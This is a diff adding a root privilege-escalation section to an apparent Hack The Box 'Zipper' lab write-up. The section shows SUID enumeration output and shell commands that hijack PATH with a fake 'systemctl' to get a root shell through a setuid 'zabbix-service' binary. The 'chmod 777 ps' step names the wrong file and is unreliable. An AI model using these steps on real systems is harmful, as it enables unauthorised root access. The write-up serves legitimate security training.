@@ -1,4 +1,4 @@
-# Zipper (Writeup not finished)
+# Zipper 
 
 This is a write up on the HTB machine, Zipper. I have seen a few methods people used to obtain the initial user but this is the method I used.
 
@@ -161,6 +161,48 @@ Viewing the `/etc/passwd` shows a user `zapper` and we are able to authenticate 
 ![Image](https://i.gyazo.com/aed65e3fb0ecaa12d31394138356afbe.png)
 
 #Privledge Escalation (Root)
-Now we have user, it is time to move on to Root. 
+Now we have user, it is time to move on to Root. Doing basic enumeration on the machine, such as using a privledge escalation script (https://www.rebootuser.com/?p=1758), we see something that is unsual with SUID files:
+```
+[-] SUID files:
+-rwsr-sr-x 1 root root 7556 Sep  8 13:05 /home/zapper/utils/zabbix-service
+-rwsr-xr-x 1 root root 161520 Nov 30  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 26012 May 16  2018 /bin/umount
+-rwsr-xr-x 1 root root 30112 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 63988 Mar  9  2017 /bin/ping
+-rwsr-xr-x 1 root root 43240 Jan 25  2018 /bin/su
+-rwsr-xr-x 1 root root 42400 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 62024 Jan 25  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 43684 Jan 25  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 78788 Jan 25  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 172120 Jan 17  2018 /usr/bin/sudo
+-rwsr-xr-x 1 root root 39016 Jan 25  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 78340 Jan 25  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 13960 Mar  9  2017 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 525884 Feb  9  2018 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 46436 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+```
 
+In the `/home/zapper/utils` directory before, we see the `zabbix-service` file. So how can we elevate privledges with this file?
+Lets figure out what this file does...
+
+By running the file we see that we are able to 'stop' or 'start' the Zabbix service. From this we can assume that it uses some sort of system binary. By cat the file, we find that the file is using `systemctl`:
+`... startsystemctl daemon-reload && systemctl start zabbix-agentstopsystemctl ... `
+
+We can escalate to Root by changing the path variable and creating a file named `systemctl` which spawns a shell:
+```
+cd /tmp
+echo "/bin/bash" > systemctl
+chmod 777 ps
+export PATH=/tmp:$PATH
+```
+
+Then we run the `zabbix-service` and `start` the service to trigger `systemctl`:
+```cd /home/zapper/utils
+./zabbix-service
+start or stop?: start
+```
+
+And we are root:
+![Image](https://i.gyazo.com/ba7592ed784591b356c81ef85836560a.png)
 
